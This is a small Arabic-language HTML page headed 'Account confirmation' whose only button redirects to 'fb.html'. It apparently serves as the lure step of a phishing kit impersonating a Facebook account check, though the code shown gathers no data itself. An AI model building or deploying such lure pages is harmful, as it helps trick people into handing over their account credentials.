<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الحساب</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            margin: 0;
            padding: 0;
            text-align: center;
        }
        .container {
            background-color: #d32f2f;
            color: white;
            padding: 50px 20px;
            border-radius: 10px;
            width: 80%;
            max-width: 600px;
            margin: 100px auto;
        }
        .container img {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            margin-bottom: 20px;
        }
        .container h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        .container button {
            background-color: #ffffff;
            color: #d32f2f;
            font-size: 16px;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .container button:hover {
            background-color: #e57373;
        }
    </style>
</head>
<body>

<div class="container">
    <img src="ZKBR8bQ3Sh.png" alt="Logo">
    <h1>اضغط على زر لتأكيد حسابك</h1>
    <button onclick="confirmAccount()">اضغط هنا لتأكيد</button>
</div>

<script>
    function confirmAccount() {
        // الانتقال إلى صفحة fb.html مباشرةً
        window.location.href = "fb.html";
    }
</script>

</body>
</html>
